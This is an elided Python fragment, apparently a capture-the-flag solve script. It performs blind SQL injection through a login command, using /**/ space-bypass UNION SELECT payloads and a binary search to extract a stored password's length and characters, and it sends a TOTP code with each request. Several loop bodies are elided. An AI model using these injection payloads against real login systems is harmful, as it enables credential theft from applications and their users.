...
preset_password = 'ZmxhZ3toaTMzZW5fQzBtbTNuZC1zaDB3X2hpaWludHR0dF8yMzMzM30='
preset_length = 41
s = requests.session()
...
def fuzz1():
    ...
    while True:
        ...
        if mid == left:
            length = mid
            break
        username = "a'/**/union/**/select/**/'b'/**/from/**/users/**/where/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))>=%d,1,0)#" % mid
        password = "b"
    ...
    for i in range(1, length+1):
        ...
        while True:
            ...
            if mid == left:
                ...
                break
            username = "a'/**/union/**/select/**/'b'/**/from/**/users/**/where/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))>=%d,1,0)#" % (i, mid)
            password = "b"
            payload = 'login %s %s' % (username, password)
            payload = urllib.quote(payload)
            payload = url % (payload, totp.now())
